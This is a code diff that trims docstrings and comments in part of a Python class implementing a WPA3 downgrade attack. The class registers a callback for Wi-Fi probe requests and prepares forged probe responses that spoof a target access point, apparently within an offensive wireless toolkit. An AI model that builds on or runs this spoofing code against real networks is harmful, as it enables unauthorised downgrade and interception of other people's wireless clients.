@@ -51,14 +51,7 @@ class WPA3DowngradeStats:
 
 
 class WPA3DowngradeAttack(Campaign):
-    """Probe-response spoofing daemon. Sync RX filter + async injection task.
-
-    Event-driven: ``_loop()`` registers the RX callback and idles until stopped;
-    ``teardown()`` unregisters. The actual work is per-probe forged responses fired
-    from ``_rx_cb``. All work happens on the asyncio loop — the RX callback runs on
-    the loop (drivers create the RX pump via ``asyncio.create_task``), and per-probe
-    injection is scheduled via ``asyncio.create_task`` on the same loop.
-    """
+    """Probe-response spoofing daemon. Sync RX filter + async injection task."""
 
     button_id = "btn-wpa3-down"
     key = "wpa3down"
@@ -87,15 +80,12 @@ class WPA3DowngradeAttack(Campaign):
         self._active = False
         self._target_ssid_bytes = target.ssid.encode("utf-8", errors="ignore")
         self._bssid_bytes = _str_to_mac(target.bssid)
-        # Pre-built template with a 6-byte placeholder for Addr1 (dest = client).
-        # Per-probe work is just splicing in the client MAC + sending.
         self._template = probe_resp(self._bssid_bytes, self.target.ssid, self.target.channel)
 
     # -- Lifecycle ------------------------------------------------------------
 
     async def _loop(self) -> None:
-        """Register the probe-request RX filter, then idle until stopped — the work
-        is event-driven (per-probe forged responses fire from _rx_cb)."""
+        """Register the probe-request RX filter, then idle until stopped."""
         self._active = True
         self.stats = WPA3DowngradeStats()
         self.iface.register_rx_callback(self._rx_cb)
@@ -107,8 +97,7 @@ class WPA3DowngradeAttack(Campaign):
             await asyncio.sleep(0.2)
 
     async def teardown(self) -> None:
-        """Unregister the RX filter on every exit. Idempotent; ``stats`` lives on as
-        an attribute for the screen to read after stopping."""
+        """Unregister the RX filter on every exit."""
         if not self._active:
             return
         self._active = False
@@ -121,14 +110,12 @@ class WPA3DowngradeAttack(Campaign):
     # -- Hot path: RX filter + async dispatch --------------------------------
 
     def _rx_cb(self, pkt) -> None:
-        """Sync, runs on asyncio loop. Keep this fast — minimal work, defer
-        injection to an asyncio task."""
-        if self.stopped or not self._active:   # request_stop() gates us before teardown unregisters
+        """Sync, runs on asyncio loop. Keep this fast."""
+        if self.stopped or not self._active:
             return
         if not isinstance(pkt, ProbeReqPacket):
             return
-        # Wildcard vs directed needs the raw SSID-IE length (the parser maps an empty
-        # SSID to "<hidden>"), so read the tag off the bytes here.
+        # Wildcard vs directed needs the raw SSID-IE length
         frame_bytes = pkt.raw
         if len(frame_bytes) < 28 or frame_bytes[24] != 0x00:
             return
